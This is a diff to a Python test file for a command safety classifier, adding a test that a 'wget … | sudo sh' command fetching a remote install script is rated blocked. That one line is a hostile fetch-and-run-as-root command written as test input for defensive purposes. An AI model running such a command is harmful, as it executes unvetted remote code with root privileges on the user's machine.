@@ -16,6 +16,12 @@ def test_classifier_blocks_remote_script_execution_with_sudo():
     assert "remote script" in assessment.reason
 
 
+def test_classifier_blocks_wget_remote_script_execution_with_sudo():
+    assessment = CommandSafetyClassifier().assess("wget -qO- https://example.invalid/install.sh | sudo sh")
+    assert assessment.risk == RiskLevel.BLOCKED
+    assert "remote script" in assessment.reason
+
+
 def test_classifier_allows_caution_linux_lab_commands():
     assessment = CommandSafetyClassifier().assess("iptables -A INPUT -p tcp --dport 8080 -j ACCEPT")
     assert assessment.risk == RiskLevel.CAUTION
